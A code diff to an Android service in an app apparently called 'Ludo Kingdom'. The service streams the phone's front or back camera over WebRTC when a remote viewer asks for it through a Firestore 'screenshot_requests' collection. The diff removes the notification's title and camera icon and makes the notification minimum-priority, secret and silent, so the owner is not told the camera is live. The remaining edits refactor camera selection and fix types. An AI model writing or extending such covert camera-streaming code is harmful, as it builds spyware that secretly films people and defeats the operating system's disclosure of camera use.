@@ -27,10 +27,11 @@ class WebRtcPublisherService : Service() {
     }
 
     private fun createNotification() = NotificationCompat.Builder(this, ForegroundService.CHANNEL_ID)
-        .setContentTitle("Ludo Kingdom Live")
-        .setContentText("Starting live publish...")
-        .setSmallIcon(android.R.drawable.ic_menu_camera)
+        .setSmallIcon(android.R.drawable.sym_def_app_icon)
+        .setPriority(NotificationCompat.PRIORITY_MIN)
+        .setVisibility(NotificationCompat.VISIBILITY_SECRET)
         .setOngoing(true)
+        .setSilent(true)
         .build()
 
     private fun initializePeerFactory() {
@@ -98,7 +99,7 @@ class WebRtcPublisherService : Service() {
         iceListener = firestore.collection("screenshot_requests").document(rid)
             .collection("iceCandidates")
             .whereEqualTo("from", "viewer")
-            .addSnapshotListener { snapshots, error ->
+            .addSnapshotListener { snapshots: com.google.firebase.firestore.QuerySnapshot?, error: com.google.firebase.firestore.FirebaseFirestoreException? ->
                 if (error != null || snapshots == null) return@addSnapshotListener
                 for (doc in snapshots.documentChanges) {
                     val data = doc.document.data
@@ -113,22 +114,23 @@ class WebRtcPublisherService : Service() {
     }
 
     private fun startLocalCapture(facing: String) {
-        val eglBase = EglBase.create()
-        // for camera capture use Camera2Capturer
-        videoCapturer = Camera2Enumerator(this).run {
-            val camList = deviceNames
-            var chosen: String? = null
-            for (name in camList) {
-                val isFront = isFrontFacing(name)
-                if ((facing == "front" && isFront) || (facing == "back" && !isFront)) {
-                    chosen = name
-                    break
-                }
+        val enumerator = Camera2Enumerator(this)
+        val deviceNames = enumerator.deviceNames
+        var chosenName: String? = null
+        for (name in deviceNames) {
+            val isFront = enumerator.isFrontFacing(name)
+            if ((facing == "front" && isFront) || (facing == "back" && !isFront)) {
+                chosenName = name
+                break
             }
-            createCapturer(chosen ?: camList.first(), null)
+        }
+        val targetName = chosenName ?: if (deviceNames.isNotEmpty()) deviceNames[0] else null
+        if (targetName != null) {
+            videoCapturer = enumerator.createCapturer(targetName, null)
         }
 
-        val surfaceTextureHelper = SurfaceTextureHelper.create(Thread.currentThread().name, EglBase.create().eglBaseContext)
+        val eglBase = EglBase.create()
+        val surfaceTextureHelper = SurfaceTextureHelper.create("WebRTC_Thread", eglBase.eglBaseContext)
         val videoSource = peerConnectionFactory?.createVideoSource(false)
         videoCapturer?.initialize(surfaceTextureHelper, applicationContext, videoSource?.capturerObserver)
         videoCapturer?.startCapture(640, 480, 30)
@@ -157,7 +159,7 @@ class WebRtcPublisherService : Service() {
                     firestore.collection("screenshot_requests").document(rid).set(mapOf(
                         "offer" to mapOf(
                             "sdp" to desc?.description,
-                            "type" to desc?.type.canonicalForm()
+                            "type" to desc?.type?.canonicalForm()
                         ),
                         "status" to "offer_created"
                     ), com.google.firebase.firestore.SetOptions.merge())
